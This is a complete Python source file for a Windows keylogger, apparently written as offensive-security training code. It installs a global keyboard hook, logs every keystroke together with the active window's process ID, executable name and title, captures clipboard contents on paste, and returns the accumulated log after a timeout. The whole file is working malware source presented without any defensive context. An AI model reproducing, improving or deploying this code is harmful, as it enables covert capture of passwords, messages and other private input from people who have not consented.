from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import win32clipboard
import pythoncom
import pyWinhook as pyHook
import time
import sys
import os

TIMEOUT = 600

class KeyLogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        # Handler for active window
        hwnd = windll.user32.GetForegroundWindow()
        # Pid buffer
        pid = c_ulong(0)
        # From active window extract pid and write to `pid` buffer
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        # Get Process ID value
        process_id = str(pid.value)
        # Executable buffer
        executable = create_string_buffer(512)
        # Active window
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        # Get Executable name to `executable` buffer
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
        # Window title buffer
        window_title = create_string_buffer(512)
        # Write window title to `window_title` buffer
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print('[-] Window name unknown: %s' %e)
        
        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        
        if 32 < event.Ascii < 127:
            sys.stdout.write(chr(event.Ascii))
        
        else:
            if event.Key == 'V':
                # Context manager
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print('[PASTE] %s'%value)
            else:
                print('%s'%event.Key)

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()
    hm = pyHook.HookManager()
    # Replace event listener with custom one
    hm.KeyDown = kl.mykeystroke

    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()
    
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print('done.')
